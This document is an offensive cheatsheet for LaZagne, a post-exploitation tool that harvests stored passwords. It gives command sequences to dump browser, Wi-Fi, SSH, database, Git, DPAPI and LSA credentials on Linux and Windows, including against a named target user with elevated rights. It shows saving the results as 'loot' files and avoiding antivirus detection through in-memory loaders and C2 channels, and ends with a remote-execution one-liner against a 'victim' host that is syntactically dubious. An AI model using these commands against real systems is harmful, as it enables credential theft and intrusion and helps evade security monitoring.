# LaZagne Cheatsheet

[LaZagne](https://github.com/AlessandroZ/LaZagne) is an open-source post-exploitation application used to retrieve passwords stored on a local computer. It supports Windows, Linux, and macOS across multiple categories including web browsers, email clients, Wi-Fi networks, database management software, sysadmin tools, and memory caches.

---

## Table of Contents

- [Supported Modules & Categories](#supported-modules--categories)
- [Installation & Binaries](#installation--binaries)
- [Linux Credential Harvesting](#linux-credential-harvesting)
- [Windows Credential Harvesting](#windows-credential-harvesting)
- [Targeted Category Attacks](#targeted-category-attacks)
- [Output Formats & File Export](#output-formats--file-export)
- [Operational Security & EDR Avoidance](#operational-security--edr-avoidance)

---

## Supported Modules & Categories

LaZagne extracts credentials from dozens of applications grouped into categories:
- **Browsers:** Chrome, Firefox, Edge, Opera, Brave, Chromium (history, autofill, cookies, credentials).
- **Sysadmin Tools:** WinSCP, PuTTY, OpenSSH (`id_rsa` keys / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
- **Databases:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Stored WPA2/WPA3 pre-shared keys (PSK) in OS network profiles.
- **Developer & VCS:** Git credentials (`.git-credentials`, cache), SVN, Docker tokens, AWS CLI credentials.
- **Email & Chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault & DPAPI:** LSA secrets, DPAPI master keys, Credential Manager vault items.

---

## Installation & Binaries

```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```

---

## Linux Credential Harvesting

### 1. Run All Extraction Modules
```bash
python3 laZagne.py all
```

### 2. Run with Root / Sudo Privileges (Expands Shadow & Keyring Access)
Running as `root` unlocks system secrets, Wi-Fi profiles in `/etc/NetworkManager`, and SSH keys across all `/home/*` directories:
```bash
sudo python3 laZagne.py all
```

### 3. Extract Passwords from Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```

---

## Windows Credential Harvesting

On Windows, use the standalone executable `lazagne.exe`:

### 1. Extract All Stored Passwords
```cmd
lazagne.exe all
```

### 2. Run with Elevated Privileges (Admin / SYSTEM)
Extract DPAPI master keys, LSA secrets, and cached domain credentials:
```cmd
lazagne.exe all -v
```

### 3. Extract Passwords for a Specific User (When Running as Admin)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```

---

## Targeted Category Attacks

Instead of running all modules, specify target software categories to minimize disk activity and noise:

### 1. Web Browsers Only
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```

### 2. Wi-Fi Cleartext Passwords
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```

### 3. Sysadmin & Remote Access Tools (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```

### 4. Database Clients
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```

### 5. Developer & Git Credentials
```bash
# Linux
python3 laZagne.py git
```

---

## Output Formats & File Export

Save harvested credentials directly to disk in structured formats:

### Export to JSON Format
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Creates `/tmp/loot_credentials.json` containing structured credentials, URLs, usernames, and plaintext passwords.

### Export to Plain Text
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Creates `/tmp/loot_credentials.txt`.

---

## Operational Security & EDR Avoidance

- **Antivirus Detection:** Standalone `lazagne.exe` is heavily signatured by Windows Defender and commercial EDR solutions.
- **Obfuscation & In-Memory Execution:**
  - Execute via PowerShell reflection or in-memory loaders (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
  - Use Python source version with a custom virtual environment rather than the packed PyInstaller binary.
- **Clean Artifacts:** Delete temporary loot files or redirect output directly through standard out over an encrypted C2 beacon or SSH session:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```
